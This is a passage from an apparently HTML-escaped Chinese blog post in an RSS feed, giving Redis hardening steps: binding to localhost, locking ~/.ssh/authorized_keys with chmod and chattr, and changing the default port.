&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;requirepass&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;mypassword&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4-禁止外网访问-Redis&#34;&gt;&lt;a href=&#34;#4-禁止外网访问-Redis&#34; class=&#34;headerlink&#34; title=&#34;4.禁止外网访问 Redis&#34;&gt;&lt;/a&gt;&lt;strong&gt;4.禁止外网访问 Redis&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bind&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;::1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;redis 3.2之后，redis增加了protected-mode ，在这个模式下，非绑定IP或者没有配置密码时都会报错。&lt;/p&gt;
&lt;h3 id=&#34;5-保证-authorized-keys-文件的安全&#34;&gt;&lt;a href=&#34;#5-保证-authorized-keys-文件的安全&#34; class=&#34;headerlink&#34; title=&#34;5.保证 authorized_keys 文件的安全&#34;&gt;&lt;/a&gt;&lt;strong&gt;5.保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
&lt;h3 id=&#34;6-修改默认端口&#34;&gt;&lt;a href=&#34;#6-修改默认端口&#34; class=&#34;headerlink&#34; title=&#34;6.修改默认端口&#34;&gt;&lt;/a&gt;&lt;strong&gt;6.修改默认端口&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的&lt;code&gt;port 6379&lt;/code&gt; ，比如改成&lt;code&gt;port 17033&lt;/code&gt;，让人摸不着头脑。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
    </channel>
</rss>
